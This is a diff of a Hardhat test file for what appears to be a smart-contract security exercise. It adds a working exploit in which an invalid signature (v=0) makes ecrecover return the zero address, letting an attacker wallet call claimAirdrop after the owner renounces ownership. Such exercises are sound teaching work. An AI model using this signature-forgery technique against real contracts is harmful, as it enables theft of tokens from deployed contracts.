@@ -3,9 +3,9 @@ const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
 
-const NAME = "Week22Exercise2";
+const NAME = "Week22Exercise3";
 
-describe(NAME, function () {
+describe.only(NAME, function () {
     async function setup() {
         const [owner, attackerWallet] = await ethers.getSigners();
 
@@ -15,6 +15,7 @@ describe(NAME, function () {
         return { victimContract, attackerWallet };
     }
 
+    //Exploit (medium severity) - ecrecover returns address(0) and doesn’t revert when the address is invalid
     describe("exploit", async function () {
         let victimContract, attackerWallet;
         before(async function () {
@@ -22,16 +23,13 @@ describe(NAME, function () {
         });
 
         it("conduct your attack here", async function () {
-            const factory = await ethers.getContractFactory("Week22Exercise2Hack");
-            const hackContract = await factory.deploy(victimContract.address);
-            await hackContract.connect(attackerWallet).attack();
+            //Invalid signature - should return zero address on ecrecover
+            const v = 0;
+            const r = "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
+            const s = "0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69";
 
-//            const msg = "attack at dawn";
-//            const sig = ethers.utils.arrayify("0xe5d0b13209c030a26b72ddb84866ae7b32f806d64f28136cb5516ab6ca15d3c438d9e7c79efa063198fda1a5b48e878a954d79372ed71922003f847029bf2e751b")
-//
-//            await victimContract
-//                .connect(attackerWallet)
-//                .challenge(msg, sig);
+            await victimContract.renounceOwnership(); //renounce first from owner
+            await victimContract.connect(attackerWallet).claimAirdrop(10, victimContract.address, v, r, s);
         });
     });
 });
